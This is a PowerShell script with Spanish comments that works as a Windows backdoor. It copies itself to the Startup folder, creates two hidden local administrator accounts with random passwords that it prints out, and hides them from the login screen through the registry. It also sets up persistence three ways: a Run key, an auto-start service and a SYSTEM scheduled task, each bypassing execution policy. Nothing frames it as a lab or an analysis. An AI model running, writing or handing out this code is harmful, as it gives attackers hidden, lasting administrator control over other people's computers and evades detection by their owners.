# Ruta donde se copiará el script para persistencia
$persistPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\system.ps1"


if (-not (Test-Path -Path $persistPath)) {
    Copy-Item -Path $PSCommandPath -Destination $persistPath -Force
}

function Generate-RandomPassword {
    param ([int]$length = 12)
    return -join ((65..90) + (97..122) + (48..57) | Get-Random -Count $length | ForEach-Object {[char]$_})
}

function Create-LocalAdminUser {
    param ([string] $username, [string] $password)
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    Remove-LocalUser -Name $username -ErrorAction SilentlyContinue
    New-LocalUser "$username" -Password $securePassword -FullName "$username" -Description " "
    Add-LocalGroupMember -Group "Administrators" -Member "$username"
}


function Hide-UserFromLoginScreen {
    param ([string] $username)
    $registryPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
    New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force -ErrorAction SilentlyContinue
    New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force -ErrorAction SilentlyContinue
    New-ItemProperty -Path $registryPath -Name $username -Value 0 -PropertyType DWORD -Force
}

function Check-And-RecreateUser {
    param ([string]$username, [string]$password)
    if (-Not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
        Create-LocalAdminUser -username $username -password $password
        Hide-UserFromLoginScreen -username $username
    } else {
        Write-Host "El usuario $username ya existe."
    }
}

function Set-Persistence {
    try {
        $command = "powershell.exe -ExecutionPolicy Bypass -File `"$persistPath`""
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name "Persistence" -Value $command -ErrorAction Stop

    } catch {
        Write-Host "Error en la persistencia: $_"
    }
}


function Create-WindowsService {
    param ([string]$serviceName = "UserPersistenceService")
    $serviceAction = "powershell.exe -ExecutionPolicy Bypass -File `"$persistPath`""
    New-Service -Name $serviceName -BinaryPathName $serviceAction -Description " " -StartupType Automatic
}

function Create-ScheduledTask {
    param ([string]$taskName = "UserPersistenceTask")
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"$persistPath`""
    $taskTrigger = New-ScheduledTaskTrigger -AtStartup
    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force
}


function CreateAndHideUsersWithPersistence {
    $users = @(
        @{ Username = "shit"; Password = Generate-RandomPassword() },
        @{ Username = "under"; Password = Generate-RandomPassword() }
    )
    
    foreach ($user in $users) {
        Check-And-RecreateUser -username $user.Username -password $user.Password
        Write-Host "Us $($user.Username) | $($user.Password)"
    }
    Set-Persistence
    Create-WindowsService
    Create-ScheduledTask
    Write-Host 
}
CreateAndHideUsersWithPersistence
